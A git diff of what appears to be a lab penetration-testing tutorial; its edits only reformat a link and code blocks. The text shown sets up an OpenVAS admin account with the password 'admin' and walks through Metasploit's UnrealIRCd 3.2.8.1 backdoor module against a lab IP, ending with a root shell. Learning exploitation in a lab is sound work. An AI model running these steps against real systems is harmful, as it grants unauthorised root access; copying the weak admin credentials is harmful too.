@@ -53,7 +53,7 @@ $ openvasmd —create-user=admin
 $ openvasmd —new-password=admin —user=admin
 ```
 
-Finally, scan the target and export (as a pdf) the report through the OpenVAS web interface (https://localhost:9392)[https://localhost:9392]
+Finally, scan the target and export (as a pdf) the report through the OpenVAS web interface [https://localhost:9392](https://localhost:9392)
 
 ## Metasploit - Exploit Framework
 
@@ -68,19 +68,23 @@ $ msfconsole
 Thus, we can load, configure and run the exploit:
 
 1. load the `unreal_ircd_3281_backdo­or` exploit
-    ```shell
+
+   ```shell
     msf > use exploit/unix/irc/unreal_ircd_3281_backdo­or
     ```
 2. show and assign values to the exploit arguments:
+
     ```shell
     msf > show options
     msf > set RHOST 10.0.1.101
     ```
 3. run the exploit
+
     ```
     msf > exploit
     ```
 4. Voila!
+
     ```
     whoami
     root
